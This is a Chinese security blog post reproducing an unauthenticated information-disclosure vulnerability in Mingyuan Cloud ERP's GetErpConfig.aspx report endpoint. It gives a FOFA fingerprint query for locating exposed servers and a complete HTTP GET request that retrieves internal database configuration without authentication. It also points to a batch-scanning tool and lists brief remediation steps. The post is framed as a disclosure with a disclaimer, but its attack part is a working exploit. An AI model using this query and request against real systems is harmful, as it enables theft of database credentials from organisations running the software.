#  【漏洞复现】明源云ERP报表 GetErpConfig.aspx存在信息泄露漏洞   
原创 清风  白帽攻防   2024-11-25 01:14  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
明源云ERP系统是一款云端部署的企业管理解决方案，具备高效、灵活和可定制的特点。通过支持自定义表单、报表、流程等功能，企业可根据需求进行个性化设置，提升管理效率。系统还提供移动端支持，员工可随时随地完成业务操作与数据分析，实现高效协同。此外，其精确的财务数据管理和强大的报表服务，通过数据采集、分析、可视化等功能，帮助企业全面掌控数据，满足多样化需求，显著提升运营效率。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0fqqRV0d4YwbpUIeQOqXeQYZlCB9GgFNJVA9Btdy0XX5opTC85NRGhHniarpNmibSAEWibBMWKl6fIdw/640?wx_fmt=png&from=appmsg "")  
漏洞描述  
  
明源云ERP报表服务在 GetErpConfig.aspx 接口处存在未授权信息泄露漏洞，远程攻击者无需身份验证即可利用该漏洞获取内部数据库的敏感配置信息，严重威胁系统安全性。  
fofa语法```
body="报表服务已正常运行"
```  
漏洞复现```
GET /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0fqqRV0d4YwbpUIeQOqXeQYGyDS1ZlXXNA3cDicAQYE9ibibSO8USpd6uhv7S8OaRvBxIv5xC45OvLXQ/640?wx_fmt=png&from=appmsg "")  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0fqqRV0d4YwbpUIeQOqXeQYc8HzsKuvgAXF3rsnmsMbIpUNTy88cxzVBEiasCEtwnA0hbglU3pWWWA/640?wx_fmt=png&from=appmsg "")  
修复建议  
  
  
  
  
1、关闭互联网暴露面  
  
2、设置接口访问权限  
  
3、升级至安全版本  
  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
